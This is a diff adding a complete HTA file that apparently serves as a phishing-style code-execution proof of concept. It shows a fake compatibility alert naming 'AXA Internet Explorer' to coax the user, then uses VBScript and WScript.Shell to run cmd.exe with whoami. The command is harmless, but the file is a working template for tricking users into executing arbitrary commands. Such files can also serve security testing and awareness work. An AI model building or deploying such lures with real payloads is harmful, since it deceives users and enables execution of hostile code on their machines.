@@ -1,0 +1,34 @@
+<html><head>
+<HTA:APPLICATION 
+            ID              = "testHTA" 
+            APPLICATIONNAME = "testHTA"
+            VERSION         = "0.1"
+            NAVIGABLE       = "yes"
+            SHOWINTASKBAR   = "yes"
+            SINGLEINSTANCE  = "yes"
+            WINDOWSTATE     = "normal"
+            BORDER          = "normal"
+            BORDERSTYLE     = "normal"
+            INNERBORDER     = "no"
+            CAPTION         = "yes" 
+            MINIMIZEBUTTON  = "yes"
+            MAXIMIZEBUTTON  = "yes"
+            SYSMENU         = "yes"
+            SCROLL          = "yes"
+            SCROLLFLAT      = "yes"
+            CONTEXTMENU     = "yes"
+            SELECTION       = "yes"
+        />
+<meta http-equiv="x-ua-compatible" content="IE=10">
+</head>
+  <script language="javascript" type="text/javascript">
+      function MyJsAlert() {
+        alert('This site is only compatible with AXA Internet Explorer, please activate additional controls');
+      }
+  </script>
+<script language="VBScript" type="text/vbscript">
+MyJsAlert()
+set oShell = CreateObject("WScript.Shell")
+oShell.run("c:\windows\system32\cmd.exe /K whoami")
+</script>
+</body></html>
